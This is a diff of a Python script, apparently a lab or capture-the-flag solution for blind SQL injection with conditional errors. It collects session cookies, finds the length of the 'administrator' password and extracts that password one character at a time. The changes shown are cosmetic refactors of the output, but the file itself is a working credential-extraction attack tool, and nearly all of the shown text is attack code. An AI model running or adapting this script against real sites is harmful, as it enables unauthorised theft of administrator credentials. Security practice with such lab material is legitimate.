@@ -1,16 +1,9 @@
 import requests
 import string
 import sys
-import os
 import urllib.parse
 import getopt
-
-
-def clear_screen():
-  if os.name == 'posix':
-    os.system('clear')
-  else:
-    os.system('cls')
+from halo import Halo
 
 
 def get_password_length(url, trackingId, session):
@@ -27,12 +20,8 @@ def get_password_length(url, trackingId, session):
     r = requests.get(url, cookies=cookies)
 
     if r.status_code == 200:
-      clear_screen()
-      print(f"[*] The password length is {password_length} characters long")
       break
     else:
-      clear_screen()
-      print(f"[-] The password length is {password_length} characters long")
       i += 1
       password_length += 1
 
@@ -43,7 +32,6 @@ def get_password(password_length, url, trackingId, session):
   characters = string.ascii_lowercase + string.digits
   password = ""
   message = "[-] The password for 'administrator' is: "
-  clear_screen()
   print(message, end='', flush=True)
 
   for i in range(password_length):
@@ -61,7 +49,6 @@ def get_password(password_length, url, trackingId, session):
         print(x, end='', flush=True)
         break
 
-  clear_screen()
 
   return f"[*] The password for 'administrator' is: {password}"
 
@@ -81,11 +68,13 @@ def get_cookie(url):
 
 
 def main(argv):
+  help_message = "This is the script for:\n'Blind SQL injection with conditional errors'\n\nUsage: python3 bsqli-2.py -u <url>"
+
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Blind SQL injection with conditional errors'\n\nUsage: python3 bsqli-2.py -u <url>")
-    print("\x1b[?25h")
+    print(help_message) 
+    print("\x1b[?25h", end="") # Make cursor visible 
     sys.exit(2)
 
   for opt, arg in opts:
@@ -93,18 +82,17 @@ def main(argv):
       url = arg
       trackingId, session = get_cookie(url)
     elif opt == "-h":
-      print("This is the script for:\n'Blind SQL injection with conditional errors'\n\nUsage: python3 bsqli-2.py -u <url>")
-      print("\x1b[?25h")
+      print(help_message) 
+      print("\x1b[?25h", end="") # Make cursor visible 
       sys.exit()
+
   password_length = get_password_length(url, trackingId, session)
   password = get_password(password_length, url, trackingId, session)
   print(password)
 
 
 if __name__ == "__main__":
-  # Hide Cursor
-  print("\x1b[?25l")
+  print("\x1b[?25l") # Hide cursor
   main(sys.argv[1:])
-  # Make cursor visible
-  print("\x1b[?25h")
+  print("\x1b[?25h") # Make cursor visible
   sys.exit()
